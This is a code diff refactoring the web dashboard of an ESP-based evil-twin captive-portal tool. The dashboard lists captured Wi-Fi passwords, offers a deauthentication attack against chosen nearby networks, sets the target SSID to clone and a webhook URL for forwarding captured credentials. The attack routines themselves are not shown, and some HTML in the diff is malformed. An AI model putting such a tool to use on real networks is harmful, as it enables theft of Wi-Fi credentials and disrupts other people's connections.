@@ -2,207 +2,201 @@
 
 String encryptMode(const int eC){
   if(eC == 4){ return "WPA2"; }
-  else if(eC == 2){ return "WPA"; }
-  else if(eC == 5){ return "WEP"; }
-  else if(eC == 7){ return "None"; }
-  else { return "????"; }
+  if(eC == 2){ return "WPA"; }
+  if(eC == 5){ return "WEP"; }
+  if(eC == 7){ return "None"; }
+  return "????";
 }
 
 String signalColor(const int strength){
   if(strength <= -80){ return "red"; }
-  else if(strength <= -70){ return "yellow"; }
-  else { return "green"; }
-  
+  if(strength <= -70){ return "yellow"; }
+  return "green";
 }
 
-String dashboard(const String& indexLang, const String& favicon, const String& currentSSID, const String& allPass, const int numNetworks, const bool validation, const bool deauthing, const String& webhookurl){
-  char acColor[8] = "#ff0003"; //defines the color of the accent stripes on the <h1> lines on the dashboard
+String indexDashboard(const String& favicon, const String& CSS, const String& allPass, const int numNetworks, const bool deauthing){
+  String _html = "<!DOCTYPE html>"
+  "<html>"
+    "<head>"
+      "<link rel='icon' type='image/x-png' href='data:image/png;base64," + favicon +
+      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+      "<title> Captive Portal Dashboard</title>"
+      "<style>" + CSS + "</style>"
+    "</head>"
+    "<body>"
+      "<div class='content'>"
+        "<div>"
+          "<div class='button-container'>"
+            "<h1 style='padding: 3px 0.1em; text-align: center; font-size: 40px; margin-top: 10px;'>Captive Portal Dashboard</h1>"
 
-  String _html;
-  _html.reserve(10500);
-  _html += "<!DOCTYPE html><html><head>";
-  _html += favicon;
-  
-  _html += "<meta name='viewport' content='initial-scale=1.0, width=device-width'>";
-  _html += "<title> Captive Portal Dashboard</title>";
-  _html += "<style>";
+            "<nav>"
+              "<ul id='pages'>"
+                "<li><a href='dashboard'>attack</a></li>"
+                "<li><a href='settings'>settings</a></li>"
+              "</ul>"
+            "</nav>"
+          "</div>"
 
-  _html += "* {";
-  _html += "font-family: monospace;";
-  _html += "color: #bfbfbb;";
-  _html += "margin: 0;";
-  _html += "font-size: 17px; }";
+          "<div>"
+            "<p style='color: red;'>INFO:</p>"
+            "<ul style='padding-left: 2.366vw;'>"
+              "<li style='color: red;'>! ! ! ONLY FOR EDUCATIONAL USE, USING ITON DEVICES OR NETWORKS YOU DO HAVE PERMISSION TO IS ILLEGAL AND WILL GET YOU INTROUBLE ! ! !</li>"
+              "<li>Credits to: Spacehuhn, adamff-dev,sankethj and justcallmekoko. Their projects helped me understand things, and without the knowledge I gained from their projecthis would   probably   not   work</li>"
+              "<li>To disable the webhook, submit a blank field</li>"
+              "<li>You are Currently using version: 3.0</li>"
+              "<li>Made by HEINZGUENTER</li>"
+            "</ul>"
+          "</div>"
+        "</div>"
+        "<div>"
+          "<div class='button-container'>"
+            "<h1 style='padding-right: 112px;'>Captured Passwords</h1>"
+            "<form style='display:inline-block;' method='post' action='/clearPass'>"
+              "<button style='display:inline-block;'>Delete Passwords</button>"
+            "</form>"
+            "<form style='display:inline-block;' method='post' action='/dashboard?led_off'>"
+              "<button style='display:inline-block;'>Disable LED</button>"
+            "</form>"
+          "</div>";
 
-  _html += "body { background: #36393e; }";
-  
-  _html += ".content { max-width: 1000px; margin: auto; }";
+          //adds passwords to the table if one or more was entered
+          if (allPass != "") {
+            _html+= "<table style='text-align: center;'><tbody><tr><th>Password</th><th>Seconds after Bootup</th></tr><tr><td>";
 
-  _html += ".button-container {";
-  _html += "display: flex;";
-  _html += "justify-content: space-between;";
-  _html += "align-content: center;";
-  _html += "align-items: center;";
-  _html += "flex-wrap: nowrap;";
-  _html += "flex-direction: row; }";
+            //"decodes" allpass string and add it to the table
+            for (int i = 0; i < allPass.length(); i++){
+              if (allPass[i] != '\n' && allPass[i] != '\t'){ _html += allPass[i]; } //if the char is not a special symbol that needs to be replaced add it to the field
+              else if (allPass[i] == '\t'){ _html += "</td><td>"; } //if char is a TAB char replace it with the html code for a new table cell
+              else if (allPass[i] == '\n'){ 
+                _html += "</td></tr>"; //add html code to close the cell
+                if (i + 1 - allPass.length() != 0){ _html += "<tr><td>"; } //if this is not the last char in the allpass string start a new cell
+              }
+            }
 
-  _html += ".button-container h1 { width: 70%; }";
-  
-  _html += "table {";
-  _html += "border-collapse: collapse;";
-  _html += "width: 100%;";
-  _html += "min-width: 400px;";
-  _html += "margin-bottom: 32px; }";
+          } else { _html += "<p><b style='margin: 7px 0px 7px 18px;'>No Passwords Captured yet!</b></p>"; }
+          _html += "</tbody></table>"
+        "</div>"
+        "<div>"
+          //Deauther part on the website
+          "<h1>Deauther</h1>"
+            "<div class='button-container'>"
+              "<h2>Target:</h2>";
 
-  _html += "form { display: flex; }";
-  
-  _html += "th, td {";
-  _html += "padding: 10px 6px;";
-  _html += "text-align: left;";
-  _html += "border-bottom: 1px solid #5d5d5d;";
-  _html += "font-size: 17px;";
-  _html += "text-align: center; }";
-  
-  _html += "button, input, select {";
-  _html += "display: inline-block;";
-  _html += "height: 42px;";
-  _html += "padding: 0px 25px;";
-  _html += "text-align: center;";
-  _html += "font-size: 13px;";
-  _html += "font-weight: 600;";
-  _html += "letter-spacing: .16px;";
-  _html += "background: #2f3136;";
-  _html += "border-radius: 4px;";
-  _html += "border: none;";
-  _html += "cursor: pointer;";
-  _html += "margin-right: 20px; }";
+              if(deauthing == false){
+                _html += "<form action='/deauth' methode='post'>"
+                            "<select name='target' required>"
+                              "<option value='' disabled selected>Choose</option>";
 
-  _html += "input[type=submit], button { text-transform: uppercase; }";
-
-  _html += "select {";
-  _html += "font-weight: 600;";
-  _html += "padding: 6px 20px;";
-  _html += "background-color: #2f3136;";
-  _html += "border-radius: 4px;";
-  _html += "text-align: center;";
-  _html += "border: 0;";
-  _html += "margin-right: 20px;";
-  _html += "cursor: pointer;";
-  _html += "font-size: 13px;";
-  _html += "appearance: none; }";
-
-  _html += "button:hover, input:hover, select:hover { background: #42444a; }";
-  
-  _html += "h1 {";
-  _html += "font-size: 32px;";
-  _html += "margin: 7px 10px 7px 0px;";
-  _html += "background: #2f3136;";
-  _html += "padding: 3px 16px;";
-  _html += "border-radius: 3px;";
-  _html += "border-left: solid ";
-  _html += acColor;
-  _html += " 8px;";
-  _html += "padding-left: 12px; }";
-
-  _html += "h2 {";
-  _html += "font-size: 24px;";
-  _html += "margin: 18px; }";
-
-  _html += "input[type=number] { -moz-appearance: textfield; }";
-  _html += "input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }";
-
-  _html += ".spacer { border: 0; border-top: 1px solid #5d5d5d; }";
-  
-  _html += "</style></head>";
-  
-  _html += "<body>";
-  _html += "<div class='content'>";
-  _html += "<h1 style='padding: 3px 0.1em; text-align: center; font-size: 40px;'>Captive Portal Dashboard</h1>";
-
-  _html += "<p><span style='color: red;'>INFO:<br></span><span style='color: red; font-size: 16px;'>- ! ! ! ONLY FOR EDUCATIONAL USE, USING IT ON DEVICES OR NETWORKS YOU DO HAVE PERMISSION TO  IS ILLEGAL AND WILL GET YOU IN TROUBLE ! ! !<br></span>";
-  _html += "<span>- Credits to: Spacehuhn, adamff-dev, sankethj and justcallmekoko their projects helped me understand things and without the knowlege that I have gained form their projects this would probably wouldn't work<br>- to disable the webhook submit a blank field<br>- Made by HEINZGUENTER</span></p>";
-
-  _html += "<div><div class='button-container'><h1>Settings</h1><form style='display:inline-block;' method='post' action='/defaults'><button style='display:inline-block;'>Restore Default Settings</button></form></div><div class='button-container'>";
-  _html += "<h2>Language:</h2>";
-  _html += "<form action='/language' methode='post'><select name='lang'>";
-
-  if (indexLang == "EN"){ _html += "<option value='DE'>DE</option><option selected value='EN'>EN</option>"; } 
-  else { _html += "<option selected value='DE'>DE</option><option value='EN'>EN</option>"; }
-
-  _html += "</select><input type=submit value='Change'></form></div><hr class='spacer'>";
-
-  //SSID part on the website  
-  _html += "<div class='button-container'><h2>TargetSSID:</h2>";
-  _html += "<form action='/ssid'><input value='"+ currentSSID +"' type=text placeholder='Target SSID' name=ssid required maxlength='32'><input type=submit value='Change SSID'></form>";
-  _html += "</div><hr class='spacer'>";
-
-  _html += "<div class='button-container'><h2>Password validation:</h2>";
-  _html += "<form action='/validate' methode='post'><select name='validate'>";
-
-  //check and display if validation is turned on
-  if (validation == true){ _html += "<option selected value='on'>On</option><option value='off'>Off</option>"; } 
-  else { _html += "<option value='on'>On</option><option selected value='off'>Off</option>"; }
-
-  _html += "</select><input type='submit' value='Enter'>";
-  _html += "</form></div></div><hr class='spacer'>";
-
-  _html += "<div class='button-container'><h2>WebHook:</h2>";
-  _html += "<form action='/webhook'><input value='"+ webhookurl +"' type=text placeholder='WebHook Url' name=url><input type=submit value='Change Url'></form>";
-  _html += "</div>";
-  
-  _html += "<div><div class='button-container'><h1 style='padding-right: 112px;'>Captured Passwords</h1>";
-  _html += "<form style='display:inline-block;' method='post' action='/clearPass'><button style='display:inline-block;'>Delete Passwords</button></form>";
-  _html += "<form style='display:inline-block;' method='post' action='/dashboard?led_off'><button style='display:inline-block;'>Disable LED</button></form></div>";
-  
-  //adds passwords to the table if one or more was entered
-  if (allPass != "") {
-    _html += "<table style='text-align: center;'><tbody><tr><th>Password</th><th>Seconds after Bootup</th></tr><tr><td>";
+                              for (int i = 0; i < numNetworks; i++) { //adds an selection entry for every network
+                                _html += "<option value='"; _html += i; _html += "'>" + WiFi.SSID(i) + "</option>";
+                              }
     
-    //"decodes" allpass string and add it to the table
-    for (int i = 0; i < allPass.length(); i++){
-      if (allPass[i] != '\n' && allPass[i] != '\t'){ _html += allPass[i]; } //if the char is not a special symbol that needs to be replaced add it to the field
-      else if (allPass[i] == '\t'){ _html += "</td><td>"; } //if char is a TAB char replace it with the html code for a new table cell
-      else if (allPass[i] == '\n'){ 
-        _html += "</td></tr>"; //add html code to close the cell
-        if (i + 1 - allPass.length() != 0){ _html += "<tr><td>"; } //if this is not the last char in the allpass string start a new cell
-      }
-    }
+                            _html += "</select>";
+              } else { _html += "<form action='/stop' methode='post'>"; }
+    
+              _html += "<input type='submit' value='Deauth'>"
+                      "</form>"
+            "</div>"
+        "</div>"
+        "<div>"
 
-  } else { _html += "<p><b style='margin: 7px 0px 7px 18px;'>No Passwords Captured yet!</b></p>"; }
-  _html += "</tbody></table></div>";
+          //nearby networks part
+          "<div class='button-container'>"
+            "<h1 style='padding-right: 300px;'>Nearby Networks</h1>"
+            "<form style='display:inline-block;' method='post' action='/dashboard'>"
+              "<button style='display:inline-block;'>Scan</button>"
+            "</form>"
+          "</div>"
 
-  //Deauther part on the website
-  _html += "<div><h1>Deauther</h1><div class='button-container'>";
-  _html += "<h2>Target:</h2>";
+          "<table>"
+            "<tbody>"
+              "<tr><th>SSID</th><th>Mac Adress</th><th>Channel</th><th>Signal Strength</th><th>Encryption</th></tr>";
 
-  if(deauthing == false){
-    _html += "<form action='/deauth' methode='post'>";
-    _html += "<select name='target' required>";
-    _html += "<option value='' disabled selected>Choose</option>";
+              for (int i = 0; i < numNetworks; i++) { //adds a table entry for every network
+                _html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td>" + WiFi.channel(i) + "</td><td style='color: " + signalColor(WiFi.RSSI(i)) + ";'>" + WiFi.RSSI(i)     +    "</    td><td>" + encryptMode(WiFi.encryptionType(i)) + "</td></tr>";
+              }
 
-    for (int i = 0; i < numNetworks; i++) { //adds an selection entry for every network
-      _html += "<option value='";
-      _html += i;
-      _html += "'>" + WiFi.SSID(i) + "</option>";
-    }
-  
-    _html += "</select><input type='submit' value='Deauth'>";
-  } else {
-    _html += "<form action='/stop' methode='post'>";
-    _html += "<input type='submit' value='Stop Deauthing'>";
-  }
-  _html += "</form></div></div>";
+          _html += ""
+            "</tbody>"
+          "</table>"
+        "</div>"
+      "</div>"
+    "</body>"
+  "</html>";
 
-  //nearby networks part
-  _html += "<div><div class='button-container'>";
-  _html += "<h1 style='padding-right: 300px;'>Nearby Networks</h1>";
-  _html += "<form style='display:inline-block;' method='post' action='/dashboard'><button style='display:inline-block;'>Scan</button></form></div>";
+  return _html;
+}
 
-  _html += "<table><tbody><tr><th>SSID</th><th>Mac Adress</th><th>Channel</th><th>Signal Strength</th><th>Encryption</th></tr>";
-  
-  for (int i = 0; i < numNetworks; i++) { //adds a table entry for every network
-    _html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td>" + WiFi.channel(i) + "</td><td style='color: " + signalColor(WiFi.RSSI(i)) + ";'>" + WiFi.RSSI(i) + "</td><td>" + encryptMode(WiFi.encryptionType(i)) + "</td></tr>";
-  }
-  
-  _html += "</tbody></table></div></div></body></html>";
+String settingsDashboard(const String& indexLang, const String& favicon, const String& CSS, const String& currentSSID, const bool validation, const String& webhookurl){
+  String _html = "<!DOCTYPE html>"
+  "<html>"
+    "<head>"
+      "<link rel='icon' type='image/x-png' href='data:image/png;base64," + favicon +
+      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+      "<title> Captive Portal Dashboard</title>"
+      "<style>" + CSS + "</style>"
+    "</head>"
+    "<body>"
+      "<div class='content'>"
+          "<div class='button-container'>"
+            "<h1 style='padding: 3px 0.1em; text-align: center; font-size: 40px; margin-top: 10px;'>Captive Portal Dashboard</h1>"
+
+            "<nav>"
+              "<ul id='pages'>"
+                "<li><a href='dashboard'>attack</a></li>"
+                "<li><a href='settings'>settings</a></li>"
+              "</ul>"
+            "</nav>"
+          "</div>"
+
+          "<div class='button-container'>"
+            "<h1>Settings</h1>"
+            "<form style='display:inline-block;' method='post' action='/defaults'>"
+              "<button style='display:inline-block;'>Restore Default Settings</button>"
+            "</form>"
+          "</div>"
+
+          "<div class='button-container'>"
+            "<h2>Language:</h2>"
+            "<form action='/language' methode='post'><select name='lang'>";
+
+            if (indexLang == "EN"){ _html += "<option value='DE'>DE</option><option selected value='EN'>EN</option>"; } 
+            else { _html += "<option selected value='DE'>DE</option><option value='EN'>EN</option>"; }
+
+            _html += "</select><input type=submit value='Change'></form>"
+          "</div>"
+          "<hr class='spacer'>"
+
+          "<div class='button-container'>"
+              "<h2>Password validation:</h2>"
+              "<form action='/validate' methode='post'><select name='validate'>";
+
+                //check and display if validation is turned on
+                if (validation == true){ _html += "<option selected value='on'>On</option><option value='off'>Off</option>"; } 
+                else { _html += "<option value='on'>On</option><option selected value='off'>Off</option>"; }
+
+                _html += "</select><input type='submit' value='Enter'>"
+              "</form>"
+          "</div>"
+          "<hr class='spacer'>"
+
+          //SSID part on the website  
+          "<div class='button-container'><h2>TargetSSID:</h2>"
+            "<form action='/ssid'><input value='"+ currentSSID +"' type=text placeholder='Target SSID' name=ssid required maxlength='32'><input type=submit value='Change SSID'></form>"
+          "</div>"
+          "<hr class='spacer'>"
+
+          "<div class='button-container'>"
+            "<h2>WebHook:</h2>"
+            "<form action='/webhook'>"
+              "<input value='"+ webhookurl +"' type=text placeholder='WebHook Url' name=url>"
+              "<input type=submit value='Change Url'>"
+            "</form>"
+          "</div>"
+
+      "</div>"
+    "</body>"
+  "</html>";
+
   return _html;
 }
